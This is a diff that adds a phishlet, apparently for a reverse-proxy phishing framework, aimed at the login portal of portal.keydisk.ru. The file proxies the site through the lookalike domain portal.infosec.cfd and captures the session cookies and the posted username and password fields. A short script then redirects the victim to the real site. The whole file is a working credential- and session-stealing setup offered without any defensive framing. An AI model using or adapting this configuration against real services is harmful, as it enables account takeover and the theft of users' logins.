@@ -1,0 +1,49 @@
+name: 'keydisk-portal'
+author: '@user'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'portal.keydisk.ru', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'portal.keydisk.ru', orig_sub: '', domain: 'portal.keydisk.ru', search: 'portal.keydisk.ru', replace: 'portal.infosec.cfd', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: 'portal.keydisk.ru'
+    keys: ['KEYDISK_SM_LOGIN', 'PHPSESSID', 'KEYDISK_SM_SOUND_LOGIN_PLAYED']
+
+auth_urls:
+  - '/index\.php'
+
+detection:
+  - domain: 'portal.keydisk.ru'
+    key: 'KEYDISK_SM_LOGIN'
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'USER_LOGIN'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'USER_PASSWORD'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'portal.keydisk.ru'
+  path: '/index.php'
+  js_callback: |
+    function() {
+      // Ждем полной загрузки страницы
+      if (document.readyState === 'complete') {
+        setTimeout(function() {
+          window.location.href = 'https://portal.keydisk.ru';
+        }, 5000);
+      } else {
+        window.addEventListener('load', function() {
+          setTimeout(function() {
+            window.location.href = 'https://portal.keydisk.ru';
+          }, 5000);
+        });
+      }
+    }
